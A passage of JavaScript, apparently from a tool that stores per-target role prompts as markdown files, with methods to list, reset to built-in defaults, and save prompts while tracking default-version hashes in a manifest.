    mkdirSync(dir, { recursive: true })
    this.refreshDefaultPrompts(id)
    return Object.entries(ROLE_TITLES).map(([role, title]) => {
      const p = join(dir, `${role}.md`)
      const exists = existsSync(p)
      return {
        role, title,
        content: exists ? readFileSync(p, 'utf8') : '',
        updated_at: exists ? statSync(p).mtime.toISOString() : null,
      }
    })
  }

  /** 把角色提示词恢复成内置默认（用户在界面上改坏了 / 老靶标要用新版提示词时用）。 */
  resetPrompts(id, role) {
    if (role !== undefined && role !== null) {
      this.savePrompt(id, role, DEFAULT_PROMPTS[role] || '')
      return { reset: [role] }
    }
    const done = []
    for (const r of Object.keys(ROLE_TITLES)) { this.savePrompt(id, r, DEFAULT_PROMPTS[r] || ''); done.push(r) }
    return { reset: done }
  }

  savePrompt(id, role, content) {
    if (!ROLE_TITLES[role]) throw new Error(`unknown role: ${role}`)
    mkdirSync(this.promptsDirOf(id), { recursive: true })
    const text = String(content ?? '')
    writeFileSync(join(this.promptsDirOf(id), `${role}.md`), text, 'utf8')
    /* 记下这是不是"当前内置默认"：是则将来能随新版自动升级，否则视为用户自写、永不覆盖 */
    const manifest = this.readPromptManifest(id)
    if (promptHash(text) === promptHash(DEFAULT_PROMPTS[role] || '')) manifest[role] = promptHash(text)
    else delete manifest[role]
    this.writePromptManifest(id, manifest)
    return { role, bytes: Buffer.byteLength(text) }
  }

}
